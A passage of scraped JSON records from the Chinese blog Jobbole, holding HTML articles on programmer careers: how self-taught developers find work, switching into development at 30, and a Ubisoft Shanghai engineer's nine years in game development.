class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 60</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-style.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/16", "praise_nums": 1}
{"tags": " 5 评论 ,职场,开发,程序员", "front_image_path": "full/47088ef57f09c838c2a3bc97ec1b49801c291a32.jpg", "title": "自学的程序员如何找到好工作？", "url_object_id": "d8f9f8f08d6737cb4a3e4987ebbc04cb", "url": "http://blog.jobbole.com/111497/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://brianknapp.me/how-do-self-taught-developers-actually-get-jobs/\">Brian Knapp</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：2016 年有位年轻的程序员在 Quora 上提问求助：</p>\n<blockquote><p>我今年 17 岁，从 14 岁开始编程。我主要关注 Java 语言，并在 AP 计算机科学这门课上拿了 5 分。我相当精通 Java（比如语法、主要类、GUI/JFrame 等），HTML5 和 CSS3 也不错。我感觉自己缺乏很多有用的技能，来帮助我在人才市场上推销自己（比如数据库的工作原理，以及我应该使用哪些工具），我很好奇其他人是如何学习这些东西的。我打算去大学拿一个软件开发的学位，但我开始感到有点沮丧，觉得读大学的目的就是为了工作。现在有哪些我应该上的课程，或者应该做的事情吗？</p></blockquote>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgqaiwbj8uj20nj0d3757.jpg\" width=\"620\" height=\"345\"></p>\n<h3>下面是 Brain Knapp 的回答分享︰</h3>\n<p>我认为你的看法错了。你觉得你需要上课，让别人来教你，告诉你答案。从根本上讲，自学的程序员能够做不一样的事情。</p>\n<p>自学的程序员和自学的吉他手有很多共同点。我不知道你是否玩过吉他，所以我将向你解释如何自学吉他。</p>\n<p>首先，这一切的开始是由于某人与某个吉他手产生了共鸣。大多数突然想要自学吉他的人，是想要成为另一个吉他手。之后，他们下定决心——“我也可以成为一个吉他手 ”，于是去了当地的乐器店，买了一把二手吉他（因为二手吉他更便宜，但也很酷）。</p>\n<p>接下来可能会有两种情况，要不买一本“吉他入门”或类似的书籍开始自学，要不打开 YouTube，开始学习如何弹奏自己喜爱的歌。那些尝试学习弹奏喜欢的歌的自学者，往往学得更好。</p>\n<p>当年轻的吉他手主动地学习某首歌时，他们往往需要观看视频、打印曲谱、练习和弦等等。然后，根据拿到的视频和曲谱，他们会坐下来尝试重新演绎歌曲。</p>\n<p>经过数小时的练习，不断重复和弦、独奏、节拍等，他们将能够以自己的形式表演那首歌。它不再是原来那首歌，但也够酷。</p>\n<p>然后，他们会拿起另一首歌，重复这个过程。一路走来，他们不断学习节拍、技术以及其他的东西，甚至都没有意识到学习的内容。在知道专业名词和理论前，他们已经懂得如何操作。</p>\n<p><span style=\"color: #000000\">最终，弹吉他变成了一种“直觉”，学习一首新歌也变得习以为常且不再痛苦。吉他的“语言”变得像你我说话那样容易。</span></p>\n<p>这一切的发生，背后是数千小时的艰苦练习。即使每天只练习一小时，也需要耗费数年。</p>\n<p><strong>那么，这和自学的程序员有什么关系呢？</strong></p>\n<p><span style=\"color: #000000\">事实上，真正成就自学的程序员的，就是他们会自己创建东西，很多东西。</span>要成为一个具有卓越技能的出色程序员，你必须创建东西，写代码。</p>\n<p>上课学习理论知识固然是好的，但很多教授不能跳出条条框框的束缚，以自己的方式编程。就算他们努力尝试，也做不出别人愿意用的应用程序。</p>\n<p>这并不是说他们不了解教授的知识，而是说，作为一名教授，他们掌握的技能是研究和理论性理解，而不是写代码和为客户提供价值。</p>\n<p><strong>你看到区别了吗？</strong></p>\n<p>我合作过的最好的程序员，他们的工作方式就是做东西，做很多东西，并且几乎一直这样。</p>\n<p>例如，现在几乎每个人都使用 WordPress。在 WordPress 出现很久之前，我就用 PHP 和 MySQL 创建了 3 到 5 个不同的内容管理系统。我写过游戏、移动应用程序、框架，还有 SAAS 应用程序。</p>\n<p>没人付钱让我做这些事情。我做这些事纯粹是出于好玩、学习或好奇的目的。</p>\n<p>我已经好几年都没有上过课了，即使上了，我也不觉得这会对我的事业有任何帮助。然而，如果我决定坐下来，从头开始创建我自己的计算机语言或操作系统，我打赌我一定能在过程中学到很多有趣的东西。</p>\n<p>是的，我可以带着那些想法上课，但在创建东西，犯下错误，以及真正“体会到”这一切的经历中，相比读一本书或听一次讲座，我能收获更多。</p>\n<p>因此，我给你的建议（如果你做到了，相比没有做的那些人而言，会带给你巨大的优势），就是：</p>\n<p><strong><span style=\"color: #ff0000\">解决一个你想解决的问题</span>。</strong>创建一个用于某件事的软件，解决一些你本人或他人想要通过软件解决的问题。每天为这个软件写代码，晚上写，周末也写，每天都写。即使你每天只花了 15 分钟写代码，也没关系。</p>\n<p>最终，你将得到一个能用的软件，这很不错。</p>\n<p><span style=\"color: #ff0000\"><strong>然后，你再重复这一过程。做一个其他的东西。不断地做。花费大量的时间，通过创建更多的东西来提升你的技能。</strong></span></p>\n<p>做东西的同时，注意在你的网站上保存工作，并将其放在一个作品集中。每次你结束了一个项目，就将它上传到 Hacker News、Reddit 或其他什么网站，并发条关于它的博文。</p>\n<p>你现在仅仅 17 岁，当你 20 岁的时候，你已经轻松地将两千多小时用于锻炼技能，你的个人作品集中也有了大概十到二十多个软件，你学习到的经验是那些仅仅上课的人无法比拟的。</p>\n<p>更重要的是，你已经清楚地告诉别人，你能够独立地写代码，解决问题并给世界带来一些新东西。这是最难能可贵的一点，也是公司在不断追求的一点。</p>\n<p><span style=\"color: #ff0000\"><strong>一旦你找到了工作，请继续在业余时间创建东西，并提升你的工作技能</strong></span>。你的提升速度将比你的同事更快，因为他们在下班回家后看电视，而不是学习、成长或创建东西。他们拿到了薪水就回家享受去了。</p>\n<p>你做的越多，你学的也越多；你学的越多，你的价值就越高；你的价值越高，你就越容易找到工作，你的工资也就更高，这是一个良性循环。</p>\n<p>所以，去做些东西出来。现在就开始写代码吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111497\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111497votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111497\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            我见青山多妩媚，料青山见我应如是        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/7cc829d3gy1fgqaiwbj8uj20nj0d3757.jpg"], "fav_nums": 12, "comment_nums": 5, "create_date": "2017/06/19", "praise_nums": 4}
{"tags": "程序员,职场", "front_image_path": "full/1fa2a48d2861decd9ce91a980d2cbf42c7800763.jpg", "title": "30 岁转行做初级程序员是什么样的体验", "url_object_id": "df681e6513a624d137705e1cd73fb5cc", "url": "http://blog.jobbole.com/109944/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://hackernoon.com/being-a-junior-developer-at-30-38309f1daee8\">Eva Lettner</a>   译文出处：<a target=\"_blank\" href=\"https://sdk.cn/news/7081\">SDK/鲁行云</a>   </div><p>改变职业是一件吓人的事情，有时候还会成为一件危险的事情。年龄越大，危险就越高。从头学起一样东西，难度总是非常高，尤其是当你身边的人都比你年纪小，而且比你成就高的时候。我在30岁的时候进入科技行业，在这个旅程中我收获了难忘的经历，见到了优秀的人，并且得到了许多机会。</p>\n<p>今天是我 32 岁生日，我想要在这一天回顾过去一年来的旅程、机遇、新朋友和那些让人窒息的挑战。</p>\n<p><em><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgn22fpk57j20m80et77o.jpg\" width=\"690\" height=\"460\"></em></p>\n<p style=\"text-align: center;\"><em>（2017年5月，我在 We Are Developers 活动上演讲 ）</em></p>\n<p>二十几岁的时候，我觉得自己到了 32 岁的时候一定已经找到了自己想要的东西。我曾经憧憬自己成为一个幸福的女人，有着美满的人生，自己喜欢的工作，穿着美美的高跟鞋，而且给自己制定了详细的未来计划。</p>\n<p>但是现实和梦想总是存在着差距，我今天脸上的妆还是昨天画的，穿的是老公的衬衫。我的生活的确很幸福，但是和我当初想象的却大相径庭，而我的职业才刚刚起步。我从来不穿高跟鞋，因为我觉得它们不舒服，而对于未来，我根本没有计划！</p>\n<p>我用了很长的时间才进入了科技行业，一路上有眼泪，也有沮丧。本来我的理想是成为一名语言学家，我希望环游世界，在各个知名学府里翻译古代文本。后来，我的母亲不幸的得了癌症，一切对我来说都不再重要了。病痛折磨了她两年半的时间，在这段时间里，我的生活也停滞了。我感到无比难过，大学不再重要，我的学位也不再重要，我刹那间迷失在生活中，漫无目的。</p>\n<p>虽然用了一段时间，但是最后我还是从悲痛中恢复了。我突然想到回去做曾经喜欢的Web设计工作。我之前一直很喜欢Web设计，但是从来没有想过将它作为我的职业。于是我开始学习写代码，并且找到了一个为期两年的项目，我在这个项目中认识了<a href=\"https://twitter.com/mmatuzo\"><u>Manuel Matuzovic</u></a>，他是我的老师，并且我们最后成为了朋友，我也将他视为是我的导师。他不断的给我设定挑战，并且挖掘了我的潜力。</p>\n<p>大约一年以前，我成为了一名全职开发者，我想要总结一下这一年的经验，并且和所有人分享，一个30多岁的人是如何进入科技行业的：</p>\n<h3>大家都好年轻！</h3>\n<p>在我刚刚入职的时候，我是公司里年级最大的人，而且还是一个初级开发者。这种感觉很奇怪，尤其是在我之前的工作中，我曾是管理层的一员，管理者一个超过60人的团队。</p>\n<p>我一度觉得自己完全无法赶上身边的人，他们都比我强太多了。这种感觉如今依然会时不时的向我袭来，但是在我找到自己的强项之后，这种感觉就没有那么强烈了。</p>\n<p>因此我的建议是：找到你喜欢的东西，让自己获得提高，自信来源于练习。</p>\n<h3>冒充者综合征真的存在</h3>\n<p>编程的好坏是装不出来的。对于我这样容易担心的人来说，把代码发给同事去审核就像是一个噩梦。我总是觉得自己是个loser，觉得自己永远都没有进步。在我看来，克服这种感觉的关键在于沟通。我跟老板说了我的不安全感，并且请他评价了我的代码质量，以及询问他我这一段时间里是否有了进步。每当遇到不同的问题，我就会去提问，不断的从他和其他人那里学习。很幸运，我的老板和同事都是很好的人，他们让我敢于向他们提问。</p>\n<h3>身边的人很重要</h3>\n<p>和其他工作一样，作为一名开发者也需要积攒人脉。你的同时、客户、用户。</p>\n<p>我在科技大会上见到了很多优秀的人。这个行业的气氛真的很不错，人与人之间彼此尊重、彼此学习。当时，和其他行业一样，科技行业也有丑陋的一面，但是我感觉到了人与人之间的对话。我们还有很大的进步空间，而且我们都在不断努力。</p>\n<h3>不仅是份工作</h3>\n<p>在之前的工作中，每天下班之后，我都不想在去考虑任何与工作有关的事情。而在科技行业，下班后我不是直接回家，而是去参加各种meetup。而周末的时候，我回去参加hackathon，各种科技大会我都会参加，有时还会自己组织一些活动。</p>\n<p>当一名开发者是一种非常特别的体验。离开办公室之后，你的工作并没有停止。</p>\n<h3>公开演讲是一件有意思的事情！</h3>\n<p>我是个有梦想的人，进入科技行业也想要取得成功。尽管从来没有特别准备过，但是我在维也纳参加meetup的时候，却马上成为了一名科技演讲人，在1000人面前进行演讲。也许是因为年纪大了，我现在不再害怕在众人面前说话，甚至开始享受这种感觉。我甚至还开始教其他人东西。我觉得22岁的我一定做不到这一点。</p>\n<h3>我的未来在哪里？</h3>\n<p>希望能够获得更多的公开演讲机会，更多的编程挑战，参加更多的大会，拥抱更多优秀的人，让我的职业生涯更圆满。</p>\n<p>如果你正在考虑转行，但是担心自己的年纪太大，请听我一句话：追求幸福和成功，享受你的工作，在工作中结实优秀的人，这一切都不受年龄的限制。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"109944\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"109944votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"109944\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgn22fpk57j20m80et77o.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/06/16", "praise_nums": 2}
{"tags": "程序员,职场,游戏", "front_image_path": "full/37d4eb0422ad391a3cea574bc52cd9a2ec0614ca.jpg", "title": "九年游戏开发经验谈", "url_object_id": "4057d0a4af8aa2f6c9d6dd4716b2d87b", "url": "http://blog.jobbole.com/109943/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>【导读】：程序员是一个充满了躁动与焦虑的职业，新人的不断涌入和频繁的跳槽正在不断消磨人们对这个行业的安全感。而我有幸认识了这样一位工程师，他从 08 年就加入育碧上海工作室从事他所热爱的游戏开发。这九年的时间里，他见证了游戏行业的蓬勃发展，开发技术的日新月异，而育碧也见证了他由青涩到成熟，在游戏开发行业中渐渐闯出自己的一番天地。</p>\n<blockquote><p>育碧是全球领先的游戏制作、发行及分销商，创建于1986年。在全球拥有30个工作室，10000名员工。育碧上海工作室是育碧亚太区的核心研发中心。自1996年成立以来，约400位顶尖人才正不断推出高品质3A级端游、页游和手游产品。同时上海工作室也承担着育碧亚太网络数据中心的重要角色。</p></blockquote>\n<p>除了育碧旗下全球畅销游戏作品《刺客信条》、《波斯王子》、《雷曼》、《孤岛惊魂》和《看门狗》，游戏发烧友们一定还知道《我还活着》、《细胞分裂系列》和《彩虹六号：围攻》等等。这些游戏从设计，制作，不断打磨完善，到最终呈现在玩家面前，都离不开游戏开发工程师们的努力，其中就包括曹檬恺。这些脍炙人口的游戏，就是由他和育碧全球各工作室的同事一起，将一行行代码转化为精美的画面，生动的人物，炫酷的操作和流畅的剧情。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fgn2pbhpw9j213r0mcwo9.jpg\" width=\"690\" height=\"388\"></p>\n<p>读书期间，曹檬恺就是热爱游戏的众多青年之一，在玩游戏的过程中，他逐渐对游戏开发产生了浓厚的兴趣。被《刺客信条》宣传视频深深震撼的他毅然决定加入育碧。九年时间里，不同的工作角色给了他与众不同的体验。兴趣和责任激励他不断开阔视野，充实自己的技术栈，由初出茅庐成长为技术负责人。</p>\n<p>当被问到有没有考虑过离开育碧的时候，他给了我一个否定答案。曹檬恺告诉我，跳槽并不是程序员的必由之路，选择一个适合自己的公司非常重要。在已过去的九年和未来的职业生涯中，能够和志同道合的人一起做自己热爱的事业，保持学习和成长的状态，体会游戏上线所带来的成就感，对于一名游戏开发工程师来说，是相当享受的一件事。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fgn2pfmwczj213r0mc480.jpg\" width=\"690\" height=\"388\"></p>\n<p>作为“过来人”，对想进入游戏开发领域的新人，或是处于工作迷茫期不知如何做选择的人，曹檬恺分享了自己的经验：</p>\n<h3>兴趣是最好的老师，勇敢追求自己喜欢的事业</h3>\n<p>要坚持做一件事，仅靠毅力还不够，还需要兴趣作为不断探索钻研的动力。在曹檬恺看来，相较于其他类型的软件开发，游戏开发有其独特的魅力。它是创意与技术的结合：在工作中，每天都能接触到最前沿的图形技术，并将其运用到游戏当中，制作出生动有趣的作品。从游戏玩家到参与设计制作游戏，是一个很大的跨越。当真正参与到游戏项目中的时候，能够体会到普通游戏玩家所体会不到的乐趣。尤其是在育碧这种多文化背景的环境下，能与不同职位，来自不同国家工作室的同事们交流，感受思维的碰撞。</p>\n<p>很多人期待加入这个行业，但因为种种原因望而却步，他们缺乏的是把“想”变成“做”的过程。曹檬恺希望更多喜欢游戏的年轻人，以及处于观望状态中的朋友能勇敢迈出这一步，加入到游戏开发的队伍中来。</p>\n<h3>不局限于短期利益，放眼长远发展</h3>\n<p>无论是游戏行业还是其他软件开发行业，进步都不是一两天的功夫。选择了这个职业就等于选择了终身学习。多思考，多积累，由此不断提升自己。相比于一些短期的利益，一个能让人不断成长的工作环境才是至关重要的。</p>\n<p>曹檬恺说，很多人在工作一段时间以后就会感觉遇到了瓶颈，没有了提升的空间，这对个人感受和未来发展都很不利。而他在育碧的九年时间里能一直保持成长的状态主要来源于以下几方面。</p>\n<p>首先，从刚进入工作岗位到成长为团队的负责人，这个过程本身就体现了作为一名程序员良性并且长远的职业发展路径。同时，他的工作角色一直在变化之中，经历了由开发工具维护、引擎维护、功能开发、游戏玩法设计实现等等。不同的角色让他有机会涉猎包括传统软件开发、动画、AI、图形等各种类型的技术，开拓了视野，对自己本身的定位有了更好的认识。其次，游戏项目当中离不开组内所有成员的协作分工，除了每天会和不同职位的人打交道，大型团队中的分工细化也能让开发人员在某一个领域深入钻研，这是选择大公司大团队的一个明显优势。另外，随着各个工作室之间合作的加强，有机会接触到像《刺客信条》《孤岛惊魂》这些最知名的游戏，其代码经过了十几二十年的沉淀，从中可以学到很多东西，磨炼个人技术水平。</p>\n<h3>紧跟潮流，了解行业技术前沿</h3>\n<p>一个尊重技术、紧跟潮流的公司对开发人员有着非常积极的影响。个人的成长与公司产品的成长密不可分。如今的游戏行业，一方面，社交主导的手游正在兴起，另一方面，更高精尖的图形技术和 AI 技术也在不断运用到游戏设计中来。例如游戏中一个非常不起眼的 NPC，从一点移动到另一点的简单过程，也会运用到寻路等算法。又例如在图形技术中，从最早的DX9.0到目前的DX12。这些新技术的运用使玩家获得更丰富的游戏体验。而产品的成功，自然需要开发人员不断吸收新技术，并与现有的产品完美结合。</p>\n<p>除此之外，个人也要多了解游戏行业发展趋势，不仅要学习新技术，还要发现游戏的新玩法新创意，多关注国内外的论坛，大牛的博客，专业的游戏测评网站等等。</p>\n<h3>责任就是动力</h3>\n<p>有些人会觉得参与项目责任越大压力越大，但曹檬恺却认为责任就是动力。在一个项目当中，每个人都有着举足轻重的作用。一款游戏并非从一开始就全部设计完成，只需要工程师按部就班地去实现。在设计师提出需求以后，还要在实现过程中不断打磨，以期带给玩家最棒的游戏体验。在打磨过程中迸发出的新想法，根据个人经验理解所做的技术优化都会为游戏增色不少。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fgn2pju4doj213q0myqam.jpg\" width=\"690\" height=\"399\"></p>\n<p>在育碧上海工作室，能接触到大 IP，参与大型游戏开发项目更是难得的机会。在承担其中的部分工作的同时还需要管理团队，这会让自己感受到肩上的责任，努力把任务完成好。当你或是整个项目组为了一款游戏做了很多付出，看到它最终被推向市场，获得玩家的肯定时，这种巨大的成就感是其他事情所不能比拟的。大项目中的技术沉淀也值得每一个技术人员深入探讨研究，从中学习有用的经验。</p>\n<h3>劳逸结合，丰富生活</h3>\n<p>一个轻松愉快的工作氛围能使人全身心投入工作，也能追求工作与生活的平衡。好的项目团队就像一个家，大家的目标都是相同的，为了把游戏做好。工作中要平等交流互相学习，工作之余，同事间也能一起参加各种活动，成为朋友，一起游游泳、踢踢球。朋友多了，运动多了，保持身心愉悦工作自然会越做越好。</p>\n<p>现在很多公司会强调加班文化。曹檬恺坦言，自己也会加班，但不是为了赶工完成任务，而是根据自身情况选择最佳状态完成工作。有些人晚上工作效率会更高，白天的时间会用来完成一些个人的学习，公司给员工更多自由其实对双方都是颇有益处的。</p>\n<p>除了技术上的提升，公司里多一些其他职场相关的培训也很有意义，例如和顶级游戏工作室学习工作方式，针对英语和演讲方面的训练，对自己未来的职业发展非常有帮助。</p>\n<p>最后，曹檬恺用三个词语概括了在育碧的这九年：<strong>笃定、学习和动力</strong>。他对工作的选择、职业的发展规划、学习的方式都为年轻的工程师们提供了宝贵的借鉴意义。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fgn2pp75ryj213p0newq8.jpg\" width=\"690\" height=\"407\"></p>\n<p>在 IT 圈人员流动速度快、人心浮躁的大环境下，曹檬恺却对我说，他和同事们都非常享受现在的工作状态，希望继续留在育碧，专心于技术，做玩家喜爱的游戏。育碧上海工作室团队中不乏工作了十年，十五年甚至更长时间的老员工。他也期待更多热爱游戏热爱技术的人加入其中，为育碧注入新鲜的血液。不论你擅长是游戏逻辑编程，UI 编程还是手游，这里都会有你的一片天地。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/07/acb658caeaa7401d5d7d20f28a1eab52.png\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"109943\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"109943votetotal\">6</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"109943\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">刘唱</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/5f17a18404975a50e3a341f2f8e27d59.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            数据挖掘研究生        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/liuchang\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/liuchang/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 33</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://www.jianshu.com/u/04b72e40cddc\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2577872237\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：learningDM\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/63918611gy1fgn2pbhpw9j213r0mcwo9.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/16", "praise_nums": 6}
